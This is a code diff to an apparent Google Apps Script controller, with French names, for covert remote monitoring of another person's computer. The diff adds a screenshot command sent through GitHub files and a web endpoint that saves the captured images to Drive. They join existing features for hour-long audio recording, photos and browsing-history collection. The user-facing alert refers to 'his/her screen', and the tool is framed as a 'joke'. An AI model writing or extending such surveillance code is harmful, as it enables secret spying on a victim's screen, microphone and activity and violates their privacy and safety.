@@ -24,7 +24,8 @@ const LOCK_PATH    = 'data/blague_lock.json';
 const PHOTO_PATH   = 'data/blague_photo.json';
 const LISTING_PATH = 'data/blague_listing.json';
 const AUDIO_PATH   = 'data/blague_audio.json';
-const HISTORY_PATH = 'data/blague_historique.json';
+const HISTORY_PATH     = 'data/blague_historique.json';
+const SCREENSHOT_PATH  = 'data/blague_screenshot.json';
 const JOURS_MAX    = 30;
 
 function _token() {
@@ -112,6 +113,14 @@ function enregistrerAudio() {
   SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
 }
 
+// ── CAPTURE D'ECRAN ──────────────────────────────────────────────
+
+function prendreCapture() {
+  const f = _githubGet(SCREENSHOT_PATH);
+  _githubPut(SCREENSHOT_PATH, { take_screenshot: true }, f.sha);
+  SpreadsheetApp.getUi().alert('🖥️ Capture envoyée ! La photo de son écran arrive dans Drive dans quelques secondes.');
+}
+
 // ── HISTORIQUE NAVIGATION ────────────────────────────────────────
 
 function demanderHistorique() {
@@ -177,6 +186,13 @@ function doPost(e) {
     if (data.type === 'audio') {
       const bytes = Utilities.base64Decode(data.audio);
       const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
+      DriveApp.getFolderById(FOLDER_ID).createFile(blob);
+      return ContentService.createTextOutput('ok');
+    }
+
+    if (data.type === 'screenshot') {
+      const bytes = Utilities.base64Decode(data.image);
+      const blob  = Utilities.newBlob(bytes, 'image/png', data.filename);
       DriveApp.getFolderById(FOLDER_ID).createFile(blob);
       return ContentService.createTextOutput('ok');
     }
